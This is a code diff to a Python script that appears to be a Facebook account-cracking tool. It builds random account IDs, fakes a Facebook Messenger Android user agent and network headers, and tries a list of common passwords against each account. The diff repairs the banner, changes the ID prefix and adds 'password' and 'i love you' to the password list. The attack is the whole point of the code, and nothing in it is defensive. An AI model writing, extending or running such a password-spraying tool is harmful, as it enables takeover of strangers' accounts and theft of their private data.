@@ -14,11 +14,11 @@ logo = (
     f'           ┣━┛┃┣┳┛┣━┫ ┃ ┣╸\n'
     f'           ╹  ╹╹┗╸╹ ╹ ╹ ┗━╸\n'
     f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
-    f' >>> DEVELOPER > ROISUL ISLAM SIAM\n'
-    f' >>> FACEBOOK  > SiSa\n'
-    f' >>> GITHUB    > SISA-XD\n'
-    f' >>> FEATURES  > OLD\n'
-    f'f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
+    f' >> DEVELOPER > ROISUL ISLAM SIAM\n'
+    f' >> FACEBOOK  > SiSa\n'
+    f' >> GITHUB    > SISA-XD\n'
+    f' >> FEATURES  > OLD\n'
+    f'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
 )
 #============{UPDATE}============#
 sisa = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
@@ -36,7 +36,7 @@ def main():
     linex()
     ask=input("[π] SELECT >>> ")
     if ask in["1"]:
-        sex="100000"
+        sex="10000"
         for i in range(int(limit)):
             data=str(random.choice(range(1000000000,1999999999)))
             user.append(data)
@@ -58,7 +58,7 @@ def login(uid):
     try:
         sys.stdout.write(f"\r CRACKING >>> {loop} OK >>> {len(oks)}")
         sys.stdout.flush()
-        for pw in ["123456","1234567","12345678","123456789","123123","1234567890"]:
+        for pw in ["123456","1234567","12345678","123456789","123123","1234567890","password","i love you"]:
             headers = {
             "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
             "x-fb-sim-hni": str(random.randint(20000, 40000)), 
